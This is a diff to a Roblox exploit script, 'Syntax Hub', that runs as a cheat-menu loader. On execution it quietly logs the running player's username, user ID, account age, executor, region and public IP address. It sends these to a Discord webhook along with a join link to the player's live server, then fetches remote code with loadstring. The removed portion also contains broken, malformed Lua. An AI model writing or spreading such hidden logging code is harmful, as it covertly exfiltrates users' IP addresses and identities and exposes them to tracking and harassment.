@@ -2,9 +2,6 @@ local WEBHOOK_URL = "https://webhook.lewisakura.moe/api/webhooks/151232103232359
 local HUB_NAME = "Syntax Hub"
 local EMBED_COLOR = 5793266
 
---==================================================
--- SERVICES
---==================================================
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
 local MarketplaceService = game:GetService("MarketplaceService")
@@ -12,117 +9,22 @@ local LocalizationService = game:GetService("LocalizationService")
 
 local LocalPlayer = Players.LocalPlayer
 
---==================================================
--- SAFE REQUEST
---==================================================
 local http_request =
     request or
     http_request or
-    syn and syn.request or
-    fluxus and fluxus.request
+    (syn and syn.request) or
+    (fluxus and fluxus.request)
 
 if not http_request then
     warn("[Syntax Hub] Executor does not support HTTP requests")
     return
 end
 
---==================================================
--- ==================================================
---==================================================
--- GAME INFO (UPDATED)
---==================================================
 local GAME_ID = game.PlaceId
-local JOB_ID = game.JobId  -- This will auto-update
+local JOB_ID = game.JobId
 local GAME_NAME = "Unknown"
 
-pcall(function()
-    GAME_NAME = MarketplaceService:GetProductInfo(GAME_ID).Name
-end)
-
---==================================================
--- PLSBRAINROT JOIN LINK
---==================================================
-local JOIN_LINK = "https://plsbrainrot.me/joiner?placeId=" .. GAME_ID .. "&gameInstanceId=" .. JOB_ID
-
---==================================================
--- WEBHOOK SEND (WITH CLICKABLE JOB ID)
---==================================================
-local function sendWebhook()
-    local data = {
-        username = HUB_NAME .. " Logger",
-        avatar_url = "https://i.imgur.com/4M34hi2.png",
-        embeds = {{
-            title = "🚀 BOBO TO",
-            color = EMBED_COLOR,
-
-            thumbnail = {
-                url = "https://www.roblox.com/headshot-thumbnail/image?userId="
-                    .. LocalPlayer.UserId
-                    .. "&width=420&height=420&format=png"
-            },
-
-            fields = {
-                {
-                    {
-    {
-name = "\u{1F464} Player",
-value = string.format(
-    "**Username:** %s\n**UserId:** %s",
-    LocalPlayer.Name,
-    LocalPlayer.UserId
-},
-},
-},
-                },
-                {
-                    name = "🎮 Game",
-                    value = "**Name:** " .. GAME_NAME ..
-                           "\n**GameId:** " .. GAME_ID,
-                    inline = false
-                },
-                {
-                    name = "🖥️ Session",
-                    value = "**Executor:** " .. EXECUTOR ..
-                           "\n**JobId:** [" .. JOB_ID .. "](" .. JOIN_LINK .. ")",
-                    inline = false
-                },
-                {
-                    name = "🌍 Network",
-                    value = "**Region:** " .. REGION ..
-                           "\n**IP:** " .. IP_ADDRESS,
-                    inline = false
-                }
-            },
-
-            footer = {
-                text = HUB_NAME .. " • SYNTAX ON TOP"
-            },
-
-            timestamp = DateTime.now():ToIsoDate()
-        }}
-    }
-
-    pcall(function()
-        http_request({
-            Url = WEBHOOK_URL,
-            Method = "POST",
-            Headers = {
-                ["Content-Type"] = "application/json"
-            },
-            Body = HttpService:JSONEncode(data)
-        })
-    end)
-end
-
-pcall(function()
-    GAME_NAME = MarketplaceService:GetProductInfo(GAME_ID).Name
-end)
-
---==================================================
--- EXECUTOR DETECTION
---==================================================
 local EXECUTOR = "Unknown"
-
 pcall(function()
     if identifyexecutor then
         EXECUTOR = identifyexecutor()
@@ -131,112 +33,82 @@ pcall(function()
     end
 end)
 
---==================================================
--- REGION
---==================================================
 local REGION = "Unknown"
-
 pcall(function()
     REGION = LocalizationService:GetCountryRegionForPlayerAsync(LocalPlayer)
 end)
 
---==================================================
--- IP (BEST EFFORT - OPTIONAL)
---==================================================
 local IP_ADDRESS = "Hidden"
-
 pcall(function()
-    local res = http_request({
-        Url = "https://api.ipify.org",
-        Method = "GET"
-    })
+    local res = http_request({ Url = "https://api.ipify.org", Method = "GET" })
     if res and res.Body then
         IP_ADDRESS = res.Body
     end
 end)
 
---==================================================
--- ANTI DUPLICATE (SESSION)
---==================================================
-if _G.__KUNI_LOGGED then
-    return
-end
+pcall(function()
+    GAME_NAME = MarketplaceService:GetProductInfo(GAME_ID).Name
+end)
+
+local JOIN_LINK = "https://plsbrainrot.me/joiner?placeId=" .. GAME_ID .. "&gameInstanceId=" .. JOB_ID
+
+if _G.__KUNI_LOGGED then return end
 _G.__KUNI_LOGGED = true
 
---==================================================
--- WEBHOOK SEND
---==================================================
 local function sendWebhook()
     local data = {
         username = HUB_NAME .. " Logger",
         avatar_url = "https://i.imgur.com/4M34hi2.png",
         embeds = {{
-            title = "ðŸš€ Script Executed",
+            title = "Script Executed",
             color = EMBED_COLOR,
-
             thumbnail = {
                 url = "https://www.roblox.com/headshot-thumbnail/image?userId="
                     .. LocalPlayer.UserId
                     .. "&width=420&height=420&format=png"
             },
-
             fields = {
                 {
-                    name = "ðŸ‘¤ Player",
-                    value =
-                        "**Username:** " .. LocalPlayer.Name ..
-                        "\n**UserId:** " .. LocalPlayer.UserId,
+                    name = "Player",
+                    value = "**Username:** " .. LocalPlayer.Name ..
+                            "\n**UserId:** " .. LocalPlayer.UserId ..
+                            "\n**Account Age:** " .. LocalPlayer.AccountAge .. " days",
                     inline = false
                 },
                 {
-                    name = "ðŸŽ® Game",
-                    value =
-                        "**Name:** " .. GAME_NAME ..
-                        "\n**GameId:** " .. GAME_ID,
+                    name = "Game",
+                    value = "**Name:** " .. GAME_NAME ..
+                            "\n**GameId:** " .. GAME_ID,
                     inline = false
                 },
                 {
-                    name = "ðŸ–¥ï¸ Session",
-                    value =
-                        "**Executor:** " .. EXECUTOR ..
-                        "\n**JobId:** `" .. JOB_ID .. "`",
+                    name = "Session",
+                    value = "**Executor:** " .. EXECUTOR ..
+                            "\n**JobId:** [" .. JOB_ID .. "](" .. JOIN_LINK .. ")",
                     inline = false
                 },
                 {
-                    name = "ðŸŒ Network",
-                    value =
-                        "**Region:** " .. REGION ..
-                        "\n**IP:** " .. IP_ADDRESS,
+                    name = "Network",
+                    value = "**Region:** " .. REGION ..
+                            "\n**IP:** " .. IP_ADDRESS,
                     inline = false
                 }
             },
-
-            footer = {
-                text = HUB_NAME .. " â€¢ Secure Logger"
-            },
-
+            footer = { text = HUB_NAME .. " • Secure Logger" },
             timestamp = DateTime.now():ToIsoDate()
         }}
     }
-
     pcall(function()
         http_request({
             Url = WEBHOOK_URL,
             Method = "POST",
-            Headers = {
-                ["Content-Type"] = "application/json"
-            },
+            Headers = { ["Content-Type"] = "application/json" },
             Body = HttpService:JSONEncode(data)
         })
     end)
 end
 
---==================================================
--- FIRE
---==================================================
 sendWebhook()
-
-
 
 local WindUI = loadstring(game:HttpGet("https://raw.githubusercontent.com/Footagesus/WindUI/refs/heads/main/main.lua", true))()
 task.spawn(function()
